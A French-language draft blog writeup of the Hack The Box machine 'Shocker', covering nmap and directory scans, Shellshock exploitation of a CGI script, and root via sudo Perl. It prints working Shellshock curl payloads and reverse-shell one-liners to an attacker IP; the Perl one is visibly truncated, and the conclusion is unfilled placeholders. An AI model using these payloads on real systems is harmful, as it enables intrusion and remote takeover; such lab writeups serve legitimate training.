---
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

title: "Shocker"
slug: "shocker"
date: 2025-11-21T15:40:23+01:00
lastmod: 2025-11-21T15:40:23+01:00
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "Découverte de /cgi-bin/, exploitation Shellshock sur user.sh, puis élévation de privilèges root via sudo Perl."
tags: ["Easy","Shellshock"]
categories: ["Mes writeups"]

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Shocker"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Shocker"
  difficulty: "Easy | Medium | Hard"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d’attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true
---

<!-- ====================================================================
Tableau d’infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d’archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Shocker> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

Dans ce writeup, **nous allons explorer** la machine **Shocker.htb**, une box emblématique d’HTB illustrant l’exploitation de la vulnérabilité **Shellshock (CVE-2014-6271)** au travers d’un script CGI exposé dans le répertoire `/cgi-bin/`. Au terme d’une énumération méthodique qui nous permet d’identifier le vecteur d’attaque, l’exploitation du script `user.sh` nous offre un premier accès au système sous l’utilisateur *shelly*. Nous poursuivons ensuite notre progression vers une **élévation de privilèges** en tirant parti d’un binaire Perl exécutable en tant que root sans mot de passe via `sudo`.
 **Ce parcours met en évidence l’importance d’une énumération rigoureuse suivie d’une exploitation ciblée et maîtrisée.**

---

## Énumération

Pour démarrer, je lance mon script d'énumération {{< script "mon-nouveau-nmap" >}} :

```bash
mon-nouveau-nmap target.htb

# Résultats dans le répertoire mes_scans/
#  - mes_scans/full_tcp_scan.txt
#  - mes_scans/aggressive_vuln_scan.txt
#  - mes_scans/cms_vuln_scan.txt
#  - mes_scans/udp_vuln_scan.txt
```


### Scan initial

Le scan initial TCP complet (mes_scans/full_tcp_scan.txt) révèle les ports ouverts suivants :

```bash
# Nmap 7.95 scan initiated Fri Nov 21 16:15:03 2025 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN mes_scans/full_tcp_scan.txt shocker.htb
Nmap scan report for shocker.htb (10.129.160.126)
Host is up (0.0069s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

# Nmap done at Fri Nov 21 16:15:11 2025 -- 1 IP address (1 host up) scanned in 7.47 seconds
```

### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Voici le résultat (mes_scans/aggresive_vuln_scan.txt) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour shocker.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"80,2222" --script="http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params" --script-timeout=30s -T4 "shocker.htb"

# Nmap 7.95 scan initiated Fri Nov 21 16:15:11 2025 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p80,2222 --script=http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params --script-timeout=30s -T4 -oN mes_scans/aggressive_vuln_scan_raw.txt shocker.htb
Nmap scan report for shocker.htb (10.129.160.126)
Host is up (0.0070s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 2222/tcp)
HOP RTT     ADDRESS
1   6.59 ms 10.10.14.1
2   6.86 ms shocker.htb (10.129.160.126)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 21 16:15:19 2025 -- 1 IP address (1 host up) scanned in 8.41 seconds

```



### Scan ciblé CMS

Le scan ciblé CMS (`mes_scans/cms_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.

```bash
# Nmap 7.95 scan initiated Fri Nov 21 16:15:19 2025 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p80,2222 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN mes_scans/cms_vuln_scan.txt shocker.htb
Nmap scan report for shocker.htb (10.129.160.126)
Host is up (0.0072s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-headers: 
|   Date: Fri, 21 Nov 2025 15:15:26 GMT
|   Server: Apache/2.4.18 (Ubuntu)
|   Last-Modified: Fri, 22 Sep 2017 20:01:19 GMT
|   ETag: "89-559ccac257884"
|   Accept-Ranges: bytes
|   Content-Length: 137
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; jpg: 1
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    Other: 1; jpg: 1
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 21 16:15:37 2025 -- 1 IP address (1 host up) scanned in 18.26 seconds

```



### Scan UDP rapide

Le scan UDP rapide (`mes_scans/udp_vuln_scan.txt`) ne met rien de vraiment exploitable en évidence pour ce CTF.

```bash
# Nmap 7.95 scan initiated Fri Nov 21 16:15:37 2025 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN mes_scans/udp_vuln_scan.txt shocker.htb
Nmap scan report for shocker.htb (10.129.160.126)
Host is up (0.0080s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   open|filtered msrpc
137/udp   closed        netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   open|filtered microsoft-ds
500/udp   closed        isakmp
514/udp   open|filtered syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown

# Nmap done at Fri Nov 21 16:15:47 2025 -- 1 IP address (1 host up) scanned in 9.43 seconds

```



### Scan répertoires
Pour la partie découverte de chemins web, j’utilise mon script dédié {{< script "mon-recoweb" >}}

```bash
mon-recoweb shocker.htb --strict
```



```bash
[✓] Domaine : shocker.htb
[✓] Fichier de résultats : mes_scans/scan_repertoires.txt
[✓] Mode : LARGE  (wordlist: /tmp/mon-recoweb_shocker.htb_wl.Zegfxm)
[*] Master : /usr/share/wordlists/dirb/common.txt
[✓] IP détectée : 10.129.160.126
[✓] Ping OK : shocker.htb (10.129.160.126) est joignable.
[*] Scan Nmap interne pour détecter les ports HTTP/HTTPS…
[*] Commande : nmap -Pn -sV -p- --min-rate 5000 -T4 --max-retries 3 -oN "/tmp/mon-recoweb_shocker.htb_nmap.f4gYob" "10.129.160.126"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 11:21 CET
Nmap scan report for shocker.htb (10.129.160.126)
Host is up (0.010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.94 seconds
[*] Ports HTTP/HTTPS détectés : 80:http
[*] whatweb sur http://shocker.htb:80/ ...
[*] Fuzzing répertoires via ffuf sur http://10.129.160.126:80/FUZZ ...

===== Résultats mon-recoweb (shocker.htb) =====
=== mon-recoweb shocker.htb START ===
Script       : mon-recoweb
Version      : mon-recoweb 2.1.6
Date         : 2025-11-22 11:21:51
Domaine      : shocker.htb
IP           : 10.129.160.126
Mode         : large
Wordlist eff.: /tmp/mon-recoweb_shocker.htb_wl.Zegfxm
Master       : /usr/share/wordlists/dirb/common.txt
Codes        : 200,301,302,403  (strict=1)
Extensions   : .php,.txt,

DIR totaux bruts   : 12
DIR totaux uniques : 12
  - /cgi-bin
  - /.hta
  - /.htaccess
  - /.htaccess.php
  - /.htaccess.txt
  - /.hta.php
  - /.hta.txt
  - /.htpasswd
  - /.htpasswd.php
  - /.htpasswd.txt
  - /index.html
  - /server-status

--- Détails par port ---
Port 80 (http)
  whatweb :
    http://shocker.htb:80/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.160.126]
  Baseline: code=404 size=288 words=32 (/sbirqjhnxjrnd)
  DIR (12)
    - /cgi-bin/
    - /.hta
    - /.htaccess
    - /.htaccess.php
    - /.htaccess.txt
    - /.hta.php
    - /.hta.txt
    - /.htpasswd
    - /.htpasswd.php
    - /.htpasswd.txt
    - /index.html
    - /server-status



=== mon-recoweb shocker.htb END ===

=============================================

[✓] Bloc mis à jour dans mes_scans/scan_repertoires.txt pour le domaine shocker.htb
 
```

La mise en évidence du répertoire `/cgi-bin/` constitue un indicateur fort : il s’agit de l’emplacement classique des scripts exécutés via le moteur CGI d’Apache, un contexte propice à l’apparition de vulnérabilités historiques comme **Shellshock**. Cette découverte mérite un examen plus approfondi du contenu du répertoire ainsi qu’un fuzzing ciblé des scripts qu’il expose.

### Scan vhosts

Enfin, je teste rapidement la présence de vhosts  avec  {{< script "mon-subdomains" >}}

```bash
mon-subdomains shocker.htb 
```



```bash
[✓] Domaine : shocker.htb
[✓] Fichier de résultats : mes_scans/scan_vhosts.txt
[✓] Mode : FAST  (wordlist: /tmp/mon-subdomains_shocker.htb_wl.vusAg3)
[*] Master : /usr/share/wordlists/htb-dns-vh-5000.txt
[✓] IP détectée : 10.129.160.126
[✓] Ping OK : shocker.htb (10.129.160.126) est joignable.
[*] Scan Nmap interne pour détecter les ports HTTP/HTTPS…
[*] Commande : nmap -Pn -sV -p- --min-rate 5000 -T4 --max-retries 3 -oN "/tmp/mon-subdomains_shocker.htb_nmap.lMppv2" "10.129.160.126"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 11:24 CET
Nmap scan report for shocker.htb (10.129.160.126)
Host is up (0.0078s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.30 seconds
[*] Ports HTTP/HTTPS détectés : 80:http
[*] Port 80 (http) : baseline…
[*] VHOST fuzzing via ffuf sur http://10.129.160.126:80/ ...

===== Résultats mon-subdomains (shocker.htb) =====
=== mon-subdomains shocker.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.1.1
Date         : 2025-11-22 11:24:38
Domaine      : shocker.htb
IP           : 10.129.160.126
Mode         : fast
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : all  (strict=0)

VHOST totaux : 0
  - (aucun)

--- Détails par port ---
Port 80 (http)
  Baseline: code=200 size=137 words=13 (Host=gqtz3nj9z4rnd.shocker.htb)
  VHOST (0)
    - (aucun)



=== mon-subdomains shocker.htb END ===

===============================================

[✓] Bloc mis à jour dans mes_scans/scan_vhosts.txt pour le domaine shocker.htb
                                                                     
```



## Exploitation – Prise pied (Foothold)

Le site web exposé par la machine est extrêmement minimaliste : il ne présente qu’une unique page contenant simplement une image, *bug.jpg*, sans aucun lien ni fonctionnalité apparente. Face à une surface d’attaque aussi restreinte, il est logique d’envisager que cette image puisse dissimuler une information utile à la progression. Nous commençons donc par la télécharger et l’analyser à l’aide des outils et méthodes décrits dans la recette **{{< recette "Outils-Stéganographie" >}}**, afin de vérifier si elle ne renferme pas un fichier embarqué, des métadonnées révélatrices ou un indice spécifique.
 Après avoir appliqué l’ensemble de ces techniques (binwalk, strings, exiftool, steghide…), **nous ne mettons en évidence aucun élément utile**, ce qui confirme que l’image ne constitue pas un vecteur d’exploitation dans ce cas.



![Bug](bug.jpg)




```bash
mon-recoweb shocker.htb/cgi-bin/ --strict --ext ".sh,.cgi,.pl"
```



```bash
[✓] Domaine : shocker.htb/cgi-bin/
[✓] Fichier de résultats : mes_scans/scan_repertoires_cgi-bin.txt
[✓] Mode : LARGE  (wordlist: /tmp/mon-recoweb_shocker.htb_cgi-bin__wl.EVFUFk)
[*] Master : /usr/share/wordlists/dirb/common.txt
[✓] IP détectée : 10.129.160.126
[✓] Ping OK : shocker.htb (10.129.160.126) est joignable.
[*] Scan Nmap interne pour détecter les ports HTTP/HTTPS…
[*] Commande : nmap -Pn -sV -p- --min-rate 5000 -T4 --max-retries 3 -oN "/tmp/mon-recoweb_shocker.htb_cgi-bin__nmap.1CXDQ8" "10.129.160.126"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 11:25 CET
Nmap scan report for shocker.htb (10.129.160.126)
Host is up (0.013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
[*] Ports HTTP/HTTPS détectés : 80:http
[*] whatweb sur http://shocker.htb:80/cgi-bin/ ...
[*] Fuzzing répertoires via ffuf sur http://10.129.160.126:80/cgi-bin/FUZZ ...

===== Résultats mon-recoweb (shocker.htb/cgi-bin/) =====
=== mon-recoweb shocker.htb/cgi-bin/ START ===
Script       : mon-recoweb
Version      : mon-recoweb 2.1.6
Date         : 2025-11-22 11:26:22
Domaine      : shocker.htb/cgi-bin/
IP           : 10.129.160.126
Mode         : large
Wordlist eff.: /tmp/mon-recoweb_shocker.htb_cgi-bin__wl.EVFUFk
Master       : /usr/share/wordlists/dirb/common.txt
Codes        : 200,301,302,403  (strict=1)
Extensions   : .sh,.cgi,.pl

DIR totaux bruts   : 14
DIR totaux uniques : 14
  - /cgi-bin
  - /cgi-bin/.hta
  - /cgi-bin/.htaccess
  - /cgi-bin/.htaccess.cgi
  - /cgi-bin/.htaccess.pl
  - /cgi-bin/.htaccess.sh
  - /cgi-bin/.hta.cgi
  - /cgi-bin/.hta.pl
  - /cgi-bin/.hta.sh
  - /cgi-bin/.htpasswd
  - /cgi-bin/.htpasswd.cgi
  - /cgi-bin/.htpasswd.pl
  - /cgi-bin/.htpasswd.sh
  - /cgi-bin/user.sh

--- Détails par port ---
Port 80 (http)
  whatweb :
    http://shocker.htb:80/cgi-bin/ [403 Forbidden] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.160.126], Title[403 Forbidden]
  Baseline: code=404 size=296 words=32 (/cgi-bin/8ufg62f83rrnd)
  DIR (14)
    - /cgi-bin/
    - /cgi-bin/.hta
    - /cgi-bin/.htaccess
    - /cgi-bin/.htaccess.cgi
    - /cgi-bin/.htaccess.pl
    - /cgi-bin/.htaccess.sh
    - /cgi-bin/.hta.cgi
    - /cgi-bin/.hta.pl
    - /cgi-bin/.hta.sh
    - /cgi-bin/.htpasswd
    - /cgi-bin/.htpasswd.cgi
    - /cgi-bin/.htpasswd.pl
    - /cgi-bin/.htpasswd.sh
    - /cgi-bin/user.sh



=== mon-recoweb shocker.htb/cgi-bin/ END ===

=============================================

[✓] Bloc mis à jour dans mes_scans/scan_repertoires_cgi-bin.txt pour le domaine shocker.htb/cgi-bin/
                                                    
```



```bash
curl -H 'User-Agent: () { :; }; echo; echo VULN' http://shocker.htb/cgi-bin/user.sh
VULN
Content-Type: text/plain
Just an uptime test script

 05:37:23 up 19:59,  0 users,  load average: 0.00, 0.00, 0.00

```



```bash
curl -H 'User-Agent: () { :; }; echo; /usr/bin/id' http://shocker.htb/cgi-bin/user.sh 
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

```



```bash
curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.152/4444 0>&1"' http://shocker.htb/cgi-bin/user.sh

```



```bash
nc -lvnp 4444                                                       
Listening on 0.0.0.0 4444
Connection received on 10.129.160.126 58744
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$
```



```bash
shelly@Shocker:/usr/lib/cgi-bin$ ls -l
total 4
-rwxr-xr-x 1 root root 113 Sep 22  2017 user.sh
shelly@Shocker:/usr/lib/cgi-bin$ ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Sep 21  2022 .
drwxr-xr-x 23 root   root   4096 Sep 21  2022 ..
drwxr-xr-x  4 shelly shelly 4096 Sep 21  2022 shelly

shelly@Shocker:/usr/lib/cgi-bin$ cd ~
shelly@Shocker:/home/shelly$ ls -la
total 36
drwxr-xr-x 4 shelly shelly 4096 Sep 21  2022 .
drwxr-xr-x 3 root   root   4096 Sep 21  2022 ..
lrwxrwxrwx 1 root   root      9 Sep 21  2022 .bash_history -> /dev/null
-rw-r--r-- 1 shelly shelly  220 Sep 22  2017 .bash_logout
-rw-r--r-- 1 shelly shelly 3771 Sep 22  2017 .bashrc
drwx------ 2 shelly shelly 4096 Sep 21  2022 .cache
drwxrwxr-x 2 shelly shelly 4096 Sep 21  2022 .nano
-rw-r--r-- 1 shelly shelly  655 Sep 22  2017 .profile
-rw-r--r-- 1 root   root     66 Sep 22  2017 .selected_editor
-r--r--r-- 1 root   root     33 Nov 21 09:38 user.txt

shelly@Shocker:/home/shelly$ cat user.txt
caf00xxxxxxxxxxxxxxxxxxxxxxxxxxxe4a7
shelly@Shocker:/home/shelly$
```



---

## Escalade de privilèges

```bash
shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/home/shelly$
```



```bash
shelly@Shocker:/home/shelly$ sudo perl -e 'use Socket;$i="10.10.14.152";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotob;if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```



```bash
nc -lvnp 12345                                                      
Listening on 0.0.0.0 12345
Connection received on 10.129.160.126 34840
root@Shocker:/home/shelly# 
```



```bash
root@Shocker:/home/shelly# cat /root/root.txt
cat /root/root.txt
be89xxxxxxxxxxxxxxxxxxxxxxxxxx9bef

```



---

## Conclusion

- Récapitulatif de la chaîne d’attaque (du scan à root).
- Vulnérabilités exploitées & combinaisons.
- Conseils de mitigation et détection.
- Points d’apprentissage personnels.

